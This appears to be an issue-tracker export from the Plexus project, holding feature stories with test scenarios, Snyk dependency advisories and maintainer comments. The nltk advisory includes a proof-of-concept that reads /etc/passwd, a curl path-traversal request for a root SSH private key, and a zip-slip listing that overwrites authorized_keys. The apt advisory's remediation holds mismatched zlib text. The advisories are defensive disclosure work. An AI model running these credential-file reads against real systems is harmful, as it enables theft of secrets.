  Scenario: Exemplars include item_id and identifiers
    Given a VectorTopicMemory block with feedback-based data
    And the dataset contains Items with known identifiers
    When generate() completes
    Then each exemplar in each topic is an object with keys "text", "item_id", "identifiers"
    And "text" is a non-empty string (the exemplar text, truncated to 300 chars)
    And "item_id" is a valid Item UUID
    And "identifiers" is a dict of external identifier key-value pairs

  Scenario: Exemplar item_id matches the source document
    Given a dataset with doc_ids = ["item-A", "item-B", "item-C", ...]
    And the clusterer assigns documents to topics
    When exemplars are assembled for a topic
    Then each exemplar's item_id is the doc_id of the representative document
    And the text matches the document at that index

  Scenario: Missing identifiers produce empty dict
    Given an Item that has no identifiers (identifiers is null or empty)
    When that Item's text appears as an exemplar
    Then the exemplar has "identifiers": {}

  Scenario: Backward compatibility with LLM labeling
    Given exemplars are now objects instead of strings
    When the LLM labeling pipeline receives exemplars
    Then it extracts the "text" field for label generation
    And labeling succeeds without error

issues.description:
**As a** report consumer, **I want** each exemplar in a memory topic to carry its source Item ID and identifiers, **so that** I can navigate from an exemplar to the original call/interaction it came from.

## Background

Exemplars in VectorTopicMemory output are currently plain strings: `"exemplars": ["Some text...", ...]`. The calling code has access to a `doc_ids` list (Item IDs in the feedback path) aligned by index with the documents list, but this linkage is lost when `_get_representative_docs` returns only text.

With Story plx-ce3556 providing `_get_representative_doc_indices()`, the calling code can now map `index → doc_ids[index] → Item ID`. This story enriches the exemplar output to carry that provenance.

## Solution

Change exemplars from `string[]` to `object[]`:

```json
{
  "exemplars": [
    {
      "text": "The agent failed to verify...",
      "item_id": "a1b2c3d4-...",
      "identifiers": {"form_id": "12345", "customer_id": "67890"}
    }
  ]
}
```

During dataset resolution, Item identifiers are fetched (Items are already loaded to get transcript text). Store `{item_id: identifiers}` in the dataset dict. During topic assembly, use `_get_representative_doc_indices()` to map exemplars to their doc_ids (Item IDs) and look up identifiers.

Both VectorTopicMemory and (later) FeedbackAnalysis benefit from this enrichment.

## Key Files

- Modify: `plexus/reports/blocks/vector_topic_memory.py` — topic assembly loop
- Modify: `plexus/reports/blocks/vector_topic_memory_test.py`
- Modify: `plexus/analysis/topic_clusterer.py` — use new `_get_representative_doc_indices()`

## Dependencies

Story plx-ce3556 (TopicClusterer returns exemplar indices)
issues.title: VectorTopicMemory exemplars carry Item ID and identifiers

## Always-Incorrect Control Flow Implementation

**Severity:** medium
**Package:** requests@2.31.0
**File:** `infrastructure/lambda_functions/metrics_aggregator/requirements.txt`

**CVSS Score:** 5.6  
**Snyk Priority Score:** 494/1000

### CVEs
- [CVE-2024-35195](https://nvd.nist.gov/vuln/detail/CVE-2024-35195)

**Fix:** Pin `requests` to version 2.32.2 or later.

### Details
## Overview

Affected versions of this package are vulnerable to Always-Incorrect Control Flow Implementation when making requests through a Requests `Session`. An attacker can bypass certificate verification by making the first request with `verify=False`, causing all subsequent requests to ignore certificate verification regardless of changes to the `verify` value.

**Notes:**

1) For requests <2.32.0, avoid setting `verify=False` for the first request to a host while using a Requests Session.

2) For requests <2.32.0, call `close()` on Session objects to clear existing connections if `verify=False` is used.

3) This vulnerability was initially fixed in version [2.32.0](https://pypi.org/project/requests/2.32.0/), which was yanked. Therefore, the next available fixed version is 2.32.2.
## Remediation
Upgrade `requests` to version 2.32.2 or higher.
## References
- [GitHub Commit](https://github.com/psf/requests/commit/a58d7f2ffb4d00b46dca2d70a3932a0b37e22fac)
- [GitHub PR](https://github.com/psf/requests/pull/6655)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-REQUESTS-6928867)
issues.title: [Snyk] SNYK-PYTHON-REQUESTS-6928867 in requests@2.31.0

## Improper Handling of Highly Compressed Data (Data Amplification)

**Severity:** high
**Package:** urllib3@2.0.7
**File:** `infrastructure/lambda_functions/metrics_aggregator/requirements.txt`

**CVSS Score:** 8.9  
**Snyk Priority Score:** 659/1000

### CVEs
- [CVE-2026-21441](https://nvd.nist.gov/vuln/detail/CVE-2026-21441)

**Fix:** Pin `urllib3` to version 2.6.3 or later.

### Details
## Overview
[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.

Affected versions of this package are vulnerable to Improper Handling of Highly Compressed Data (Data Amplification) via the streaming API when handling HTTP redirects. An attacker can cause excessive resource consumption by serving a specially crafted compressed response that triggers decompression of large amounts of data before any read limits are enforced.

**Note:**
This is only exploitable if content is streamed from untrusted sources with redirects enabled.

## Workaround 
This vulnerability can be mitigated by disabling redirects by setting `redirect=False` for requests to untrusted sources.
## Remediation
Upgrade `urllib3` to version 2.6.3 or higher.
## References
- [GitHub Commit](https://github.com/urllib3/urllib3/commit/8864ac407bba8607950025e0979c4c69bc7abc7b)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-URLLIB3-14896210)
issues.title: [Snyk] SNYK-PYTHON-URLLIB3-14896210 in urllib3@2.0.7

## Use of Cache Containing Sensitive Information

**Severity:** medium
**Package:** next@14.2.29
**File:** `dashboard/package.json`

**CVSS Score:** 6.3  
**Snyk Priority Score:** 529/1000

### CVEs
- [CVE-2025-57752](https://nvd.nist.gov/vuln/detail/CVE-2025-57752)

**Fix:** Upgrade `next` to version 14.2.31, 15.4.2-canary.19, 15.4.5 or later.

### Details
## Overview
[next](https://www.npmjs.com/package/next) is a react framework.

Affected versions of this package are vulnerable to Use of Cache Containing Sensitive Information in the image optimization process, when responses from API routes vary based on request headers such as `Cookie` or `Authorization`. An attacker can gain unauthorized access to sensitive image data by exploiting cache key confusion, causing responses intended for authenticated users to be served to unauthorized users.

**Note:** Exploitation requires a prior authorized request to populate the cache.
## Remediation
Upgrade `next` to version 14.2.31, 15.4.2-canary.19, 15.4.5 or higher.

## Improper Handling of Highly Compressed Data (Data Amplification)

**Severity:** high
**Package:** urllib3@2.0.7
**File:** `score-processor-lambda/requirements.txt`

**CVSS Score:** 8.9  
**Snyk Priority Score:** 659/1000

### CVEs
- [CVE-2025-66471](https://nvd.nist.gov/vuln/detail/CVE-2025-66471)

**Fix:** Pin `urllib3` to version 2.6.0 or later.

### Details
## Overview
[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.

Affected versions of this package are vulnerable to Improper Handling of Highly Compressed Data (Data Amplification) in the Streaming API. The `ContentDecoder` class can be forced to allocate disproportionate resources when processing a single chunk with very high compression, such as via the `stream()`, `read(amt=256)`, `read1(amt=256)`, `read_chunked(amt=256)`, and `readinto(b)` functions.

**Note:** It is recommended to patch Brotli dependencies (upgrade to at least 1.2.0) if they are installed outside of `urllib3` as well, to avoid other instances of the same vulnerability.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](https://security.snyk.io/vuln/SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `urllib3` to version 2.6.0 or higher.
## References
- [GitHub Commit](https://github.com/urllib3/urllib3/commit/c19571de34c47de3a766541b041637ba5f716ed7)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-URLLIB3-14192442)
issues.title: [Snyk] SNYK-PYTHON-URLLIB3-14192442 in urllib3@2.0.7

## Prototype Pollution **Severity:** critical **Package:** immutable@4.3.7 **File:** `dashboard/package.json` **CVSS Score:** 9.3 **Exploit Maturity:** proof-of-concept **Snyk Priority Score:** 644/1000 ### CVEs - [CVE-2026-29063](https://nvd.nist.gov/vuln/detail/CVE-2026-29063) **Fix:** Pin `immutable` to version 3.8.3, 4.3.8, 5.1.5 or later. ### Details ## Overview Affected versions of this package are vulnerable to Prototype Pollution in the `mergeDeep`, `mergeDeepWith`, `merge`, `Map.toJS`, and `Map.toObject` functions. An attacker can inject arbitrary properties into object prototypes by supplying crafted input containing special keys, potentially leading to privilege escalation or bypassing security checks. ## Details Prototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values. Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution. There are two main ways in which the pollution of prototypes occurs: - Unsafe `Object` recursive merge - Property definition by path ### Unsafe Object recursive merge The logic of a vulnerable recursive merge function follows the following high-level model: ``` merge (target, source) foreach property of source if property exists and is an object on both the target and the source merge(target[property], source[property]) else target[property] = source[property] ```
When the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype. Clone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`. `lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks. ### Property definition by path There are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)` If the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object. ## Types of attacks There are a few methods by which Prototype Pollution can be manipulated: | Type |Origin |Short description | |--|--|--| | **Denial of service (DoS)**|Client |This is the most likely attack.
DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`).
The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.
**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. | |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.
**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.| |**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.
**For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.| ## Affected environments The following environments are susceptible to a Prototype Pollution attack: - Application server - Web server - Web browser ## How to prevent 1. Freeze the prototype— use `Object.freeze (Object.prototype)`. 2. Require schema validation of JSON input. 3. Avoid using unsafe recursive merge functions. 4. Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution. 5. As a best practice use `Map` instead of `Object`. ### For more information on this vulnerability type: [Arteau, Olivier. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf) ## Remediation Upgrade `immutable` to version 3.8.3, 4.3.8, 5.1.5 or higher. ## References - [GitHub Commit](https://github.com/immutable-js/immutable-js/commit/16b3313fdf2c5f579f10799e22869f6909abf945) - [GitHub Commit](https://github.com/immutable-js/immutable-js/commit/6ed4eb626906df788b08019061b292b90bc718cb) - [GitHub Release](https://github.com/immutable-js/immutable-js/releases/tag/v4.3.8) - [GitHub Release](https://github.com/immutable-js/immutable-js/releases/tag/v5.1.5) ### Reference - [Snyk advisory](https://security.snyk.io/vuln/SNYK-JS-IMMUTABLE-15423650)
issues.title: [Snyk] SNYK-JS-IMMUTABLE-15423650 in immutable@4.3.7

## Improper Verification of Cryptographic Signature

**Severity:** low
**Package:** apt@3.0.3
**File:** `score-processor-lambda/Dockerfile`

**CVSS Score:** 3.7  
**Snyk Priority Score:** 150/1000

### CVEs
- [CVE-2011-3374](https://nvd.nist.gov/vuln/detail/CVE-2011-3374)

**Fix:** No automatic fix available. Review manually.

### Details
## NVD Description
**_Note:_** _Versions mentioned in the description apply only to the upstream `apt` package and not the `apt` package as distributed by `Debian`._
_See `How to fix?` for `Debian:13` relevant fixed versions and status._

It was found that apt-key in apt, all versions, do not correctly validate gpg keys with the master keyring, leading to a potential man-in-the-middle attack.
## Remediation

**_Note:_** _Versions mentioned in the description apply only to the upstream `zlib` package and not the `zlib` package as distributed by `Debian`._

zlib before 1.3.2 allows CPU consumption via crc32_combine64 and crc32_combine_gen64 because x2nmodp can do right shifts within a loop that has no termination condition.

## Buffer Overflow

**Severity:** medium
**Package:** fast-xml-parser@4.4.1
**File:** `dashboard/package.json`

**CVSS Score:** 6.9  
**Snyk Priority Score:** 631/1000

### CVEs
- [CVE-2026-27942](https://nvd.nist.gov/vuln/detail/CVE-2026-27942)

**Fix:** Pin `fast-xml-parser` to version 4.5.4, 5.3.8 or later.

### Details
## Overview
[fast-xml-parser](https://www.npmjs.org/package/fast-xml-parser) is a Validate XML, Parse XML, Build XML without C/C++ based libraries

Affected versions of this package are vulnerable to Buffer Overflow via the `XMLBuilder` when `preserveOrder:true` is set. An attacker can cause the application to crash by providing specially crafted input data. 

## Workaround

This vulnerability can be mitigated by using `preserveOrder:false` or by validating input data before passing it to the builder.
## Remediation
Upgrade `fast-xml-parser` to version 4.5.4, 5.3.8 or higher.
## References
- [GitHub Commit](https://github.com/NaturalIntelligence/fast-xml-parser/commit/c13a961910f14986295dd28484eee830fa1a0e8a)
- [GitHub PR](https://github.com/NaturalIntelligence/fast-xml-parser/pull/791)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-JS-FASTXMLPARSER-15353391)

## CVE-2024-56433

**Severity:** low
**Package:** shadow/login.defs@1:4.17.4-2
**File:** `score-processor-lambda/Dockerfile`

**Snyk Priority Score:** 150/1000

### CVEs
- [CVE-2024-56433](https://nvd.nist.gov/vuln/detail/CVE-2024-56433)

### Details
## NVD Description
**_Note:_** _Versions mentioned in the description apply only to the upstream `shadow` package and not the `shadow` package as distributed by `Debian`._
_See `How to fix?` for `Debian:13` relevant fixed versions and status._

shadow-utils (aka shadow) 4.4 through 4.17.0 establishes a default /etc/subuid behavior (e.g., uid 100000 through 165535 for the first user account) that can realistically conflict with the uids of users defined on locally administered networks, potentially leading to account takeover, e.g., by leveraging newuidmap for access to an NFS home directory (or same-host resources in the case of remote logins by these local network users). NOTE: it may also be argued that system administrators should not have assigned uids, within local networks, that are within the range that can occur in /etc/subuid.
## Remediation
There is no fixed version for `Debian:13` `shadow`.

issues.description:
## Prototype Pollution **Severity:** medium **Package:** js-yaml@4.1.0 **File:** `dashboard/package.json` **CVSS Score:** 6.9 **Snyk Priority Score:** 559/1000 ### CVEs - [CVE-2025-64718](https://nvd.nist.gov/vuln/detail/CVE-2025-64718) **Fix:** Upgrade `js-yaml` to version 3.14.2, 4.1.1 or later. ### Details ## Overview [js-yaml](https://www.npmjs.com/package/js-yaml) is a human-friendly data serialization language. Affected versions of this package are vulnerable to Prototype Pollution via the `merge` function. An attacker can alter object prototypes by supplying specially crafted YAML documents containing `__proto__` properties. This can lead to unexpected behavior or security issues in applications that process untrusted YAML input. ## Workaround This vulnerability can be mitigated by running the server with `node --disable-proto=delete` or by using Deno, which has pollution protection enabled by default. ## Details Prototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values. Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution. There are two main ways in which the pollution of prototypes occurs: - Unsafe `Object` recursive merge - Property definition by path ### Unsafe Object recursive merge The logic of a vulnerable recursive merge function follows the following high-level model: ``` merge (target, source) foreach property of source if property exists and is an object on both the target and the source merge(target[property], source[property]) else target[property] = source[property] ```
When the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype. Clone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`. `lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks. ### Property definition by path There are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)` If the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object. ## Types of attacks There are a few methods by which Prototype Pollution can be manipulated: | Type |Origin |Short description | |--|--|--| | **Denial of service (DoS)**|Client |This is the most likely attack.
DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`).
The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.
**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. | |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.
**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.| |**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.
**For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.| ## Affected environments The following environments are susceptible to a Prototype Pollution attack: - Application server - Web server - Web browser ## How to prevent 1. Freeze the prototype— use `Object.freeze (Object.prototype)`. 2. Require schema validation of JSON input. 3. Avoid using unsafe recursive merge functions. 4. Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution. 5. As a best practice use `Map` instead of `Object`. ### For more information on this vulnerability type: [Arteau, Olivier. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf) ## Remediation Upgrade `js-yaml` to version 3.14.2, 4.1.1 or higher. ## References - [GitHub Commit](https://github.com/nodeca/js-yaml/commit/383665ff4248ec2192d1274e934462bb30426879) - [GitHub Commit](https://github.com/nodeca/js-yaml/commit/5278870a17454fe8621dbd8c445c412529525266) ### Reference - [Snyk advisory](https://security.snyk.io/vuln/SNYK-JS-JSYAML-13961110)
issues.title: [Snyk] SNYK-JS-JSYAML-13961110 in js-yaml@4.1.0

issues.description:
**As a** report consumer, **I want** each exemplar in a memory topic to show a clickable link to its source Item using the standard identifier display, **so that** I can navigate directly to the original call/interaction that produced the feedback.

## Background

The `IdentifierDisplay` component (`dashboard/components/ui/identifier-display.tsx`) is the standard way to render Item links in Plexus. It is already used in the evaluations dashboard (`FeedbackItemsList`, `ScorecardReportEvaluation`) to show Item identifiers with copy buttons and optional URLs. It supports both single `externalId` and multiple `identifiers` key-value pairs.

With Story plx-679a29, exemplars now carry `item_id` and `identifiers`. This story wires the `IdentifierDisplay` component into the shared `TopicCard` so each exemplar shows its Item link.

## Solution

In the shared `TopicCard` component (from Story plx-17451f), when rendering an exemplar that is an object with `item_id` and `identifiers`:

1. Render the exemplar text as before (quoted italic)
2. Below or beside the text, render `<IdentifierDisplay identifiers={exemplar.identifiers} iconSize="sm" textSize="xs" displayMode="compact" />`
3. If `identifiers` is empty or absent, show only the text (no broken link)

The `IdentifierDisplay` component handles all the complexity: truncation, tooltips, copy-to-clipboard, and URL linking.

## Key Files

- Modify: `dashboard/components/ui/topic-list.tsx` — add IdentifierDisplay to exemplar rendering
- Reuse: `dashboard/components/ui/identifier-display.tsx`

## Dependencies

- Story plx-17451f (Extract shared TopicList component)
issues.title: Exemplars render with IdentifierDisplay Item links

issues.description:
## Directory Traversal

**Severity:** high
**Package:** nltk@3.8.1
**File:** `score-processor-lambda/requirements.txt`

**CVSS Score:** 8.7  
**Exploit Maturity:** proof-of-concept  
**Snyk Priority Score:** 828/1000

### CVEs
- [CVE-2026-0846](https://nvd.nist.gov/vuln/detail/CVE-2026-0846)

**Fix:** Pin `nltk` to version 3.9.3 or later.

### Details
## Overview
[nltk](http://www.nltk.org) is a Natural Language Toolkit (NLTK) is a Python package for natural language processing.

Affected versions of this package are vulnerable to Directory Traversal via the `filestring` function. An attacker can access sensitive files by supplying specially crafted input paths, such as absolute paths or directory traversal sequences, to bypass input validation and read arbitrary files on the system.

**Note:**

This is only exploitable if the function processes untrusted user input, such as in web APIs or network-accessible services.
## PoC
```
from nltk.util import filestring

#Arbitrary file read
content = filestring("/etc/passwd")
print(content)

#Windows Variant
#print(filestring("C:/Windows/System32/drivers/etc/hosts"))
```

## Details

A Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with "dot-dot-slash (../)" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.

Directory Traversal vulnerabilities can be generally divided into two types:

- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.

`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.

If an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.

```
curl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa
```
**Note** `%2e` is the URL encoded version of `.` (dot).

- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. 

One way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.

The following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:

```
2018-04-15 22:04:29 .....           19           19  good.txt
2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys
```

## Remediation
Upgrade `nltk` to version 3.9.3 or higher.
## References
- [GitHub Commit](https://github.com/nltk/nltk/commit/b2e1164bf89277f79b65406c829b99fb20ca1974)
- [Red Hat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=2445826)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-NLTK-15460783)
issues.title: [Snyk] SNYK-PYTHON-NLTK-15460783 in nltk@3.8.1

## Open Redirect

**Severity:** medium
**Package:** urllib3@2.0.7
**File:** `score-processor-lambda/requirements.txt`

**CVSS Score:** 6.0  
**Snyk Priority Score:** 514/1000

### CVEs
- [CVE-2025-50181](https://nvd.nist.gov/vuln/detail/CVE-2025-50181)

**Fix:** Pin `urllib3` to version 2.5.0 or later.

### Details
## Overview
[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.

Affected versions of this package are vulnerable to Open Redirect due to the `retries` parameter being ignored during `PoolManager` instantiation. An attacker can access unintended resources or endpoints by leveraging automatic redirects when the application expects redirects to be disabled at the connection pool level.

**Note:**

`requests` and `botocore` users are not affected.

## Workaround

This can be mitigated by disabling redirects at the `request()` level instead of the `PoolManager()` level.
## Remediation
Upgrade `urllib3` to version 2.5.0 or higher.
## References
- [GitHub Commit](https://github.com/urllib3/urllib3/commit/f05b1329126d5be6de501f9d1e3e36738bc08857)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-URLLIB3-10390194)
issues.title: [Snyk] SNYK-PYTHON-URLLIB3-10390194 in urllib3@2.0.7

issues.description:
**As a** VectorTopicMemory block, **I want** to resolve the dataset via `DatasetResolver` and produce cached embeddings, **so that** re-indexing does not mean re-embedding.

This story replaces the shell from Story plx-30a738 with real data flow. It wires up:
- `DatasetResolver` from `plexus/reports/blocks/data_utils.py` to load the dataset
- `EmbeddingService` from Epic 2 to compute embeddings with S3 caching

OpenSearch and clustering are still mocked at this stage. The block extracts text from a configurable column (`data.content_column`, defaulting to `text`) and feeds it to the embedding pipeline.

## Key Files

- Modify: `plexus/reports/blocks/vector_topic_memory.py`
- Modify: `plexus/reports/blocks/vector_topic_memory_test.py`

## Dependencies

- Story plx-30a738 (Generate returns structured output envelope)
- Story plx-3bb9ce (Batch embedding with cache-aware pipeline)

## Always-Incorrect Control Flow Implementation

**Severity:** medium
**Package:** requests@2.31.0
**File:** `score-processor-lambda/requirements.txt`

**CVSS Score:** 5.6  
**Snyk Priority Score:** 494/1000

### CVEs
- [CVE-2024-35195](https://nvd.nist.gov/vuln/detail/CVE-2024-35195)

**Fix:** Pin `requests` to version 2.32.2 or later.

### Details
## Overview

Affected versions of this package are vulnerable to Always-Incorrect Control Flow Implementation when making requests through a Requests `Session`. An attacker can bypass certificate verification by making the first request with `verify=False`, causing all subsequent requests to ignore certificate verification regardless of changes to the `verify` value.

**Notes:**

1) For requests <2.32.0, avoid setting `verify=False` for the first request to a host while using a Requests Session.

2) For requests <2.32.0, call `close()` on Session objects to clear existing connections if `verify=False` is used.

3) This vulnerability was initially fixed in version [2.32.0](https://pypi.org/project/requests/2.32.0/), which was yanked. Therefore, the next available fixed version is 2.32.2.
## Remediation
Upgrade `requests` to version 2.32.2 or higher.
## References
- [GitHub Commit](https://github.com/psf/requests/commit/a58d7f2ffb4d00b46dca2d70a3932a0b37e22fac)
- [GitHub PR](https://github.com/psf/requests/pull/6655)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-REQUESTS-6928867)

comments.author: derek.norrbom
comments.text: Investigating mismatch between pyproject.toml and root requirements.txt after re-import. Goal: explain why Snyk findings differ from score-processor-lambda requirements and verify whether root requirements is a faithful pip-compile output of pyproject direct dependencies plus resolved transitive pins.

comments.author: derek.norrbom
comments.text:
Findings from comparison:
- Root requirements.txt is a full pip-compile lock generated from pyproject.toml (`pip-compile --strip-extras pyproject.toml`).
- Direct dependency mapping is exact: 66 direct deps in pyproject and 66 entries in requirements tagged `via plexus (pyproject.toml)`.
- requirements.txt contains many additional packages (359 total) because it includes resolved transitives.

Why findings differ from score-processor-lambda:
- score-processor-lambda/requirements.txt is a manually curated subset, not a lock generated from pyproject.toml.
- It omits many pyproject direct deps (e.g., pytest/sphinx/etc.) and therefore omits their transitive graph and related findings.
- Root requirements is pinned/full-resolution; score-processor-lambda file is mostly unpinned, so Snyk resolution behavior and vulnerability set differ.

Important discrepancy spotted in imported tasks:
- New subtasks under this task reference versions like protobuf@4.24.4 and setuptools@40.5.0.
- Current root requirements.txt now resolves protobuf==6.33.5 and does not include setuptools as a pinned requirement line, suggesting imported findings are from an older snapshot/scan context.

comments.author: derek.norrbom
comments.text: Applied change to make root requirements.txt a direct-dependency manifest from pyproject.toml (for Snyk free-tier pyproject parity) instead of a pip-compile lock. Updated workflow .github/workflows/requirements-sync.yml to export  via Python/tomllib. Regenerated requirements.txt now contains 67 direct dependency lines.

comments.text:
Feature: Memory weight update integrated with cluster records

  Scenario: Full update cycle reinforces active clusters and decays inactive ones
    Given 5 existing cluster records with weights [0.5, 0.7, 0.3, 0.8, 0.4]
    And the current run matched new documents to clusters [0, 1, 3]
    When update_memory_weights(existing_clusters, active_cluster_ids=[0, 1, 3]) is called
    Then clusters 0, 1, 3 have weights higher than before
    And clusters 2, 4 have weights lower than before
    And all cluster records have updated memory_tier values

  Scenario: Weight updates are persisted to OpenSearch
    Given updated cluster weights
    When persist is called
    Then OpenSearch bulk update is invoked for each cluster record
    And each update sets the new memory_weight and memory_tier fields

  Scenario: Pruned clusters are removed from the index
    Given cluster 4 has weight below prune_threshold
    When update_memory_weights is called with prune=True
    Then cluster 4's record is deleted from OpenSearch
    And items previously in cluster 4 have cluster_id set to -1

issues.description:
**As a** topic memory system, **I want** to apply weight updates to persisted cluster records after each run, **so that** memory state is durable across runs.

After global clustering runs, the system computes which clusters were reinforced (matched new documents) and which were not (decayed). Updated weights and tiers are written back to the cluster records in OpenSearch via bulk update.

Pruned clusters (weight below threshold) are deleted from OpenSearch, and their previously-assigned items have `cluster_id` set to -1 (unassigned) to be reassigned on the next run.

## Key Files

- Modify: `plexus/analysis/memory_weights.py`
- Modify: `plexus/analysis/memory_weights_test.py`
- Modify: `plexus/analysis/opensearch_client.py` (add bulk update method for cluster records)

## Dependencies

- Story plx-9984cc (Memory weight calculation)
- Story plx-5244af (Cluster record persistence in OpenSearch)
issues.title: Memory weight update integrated with cluster records
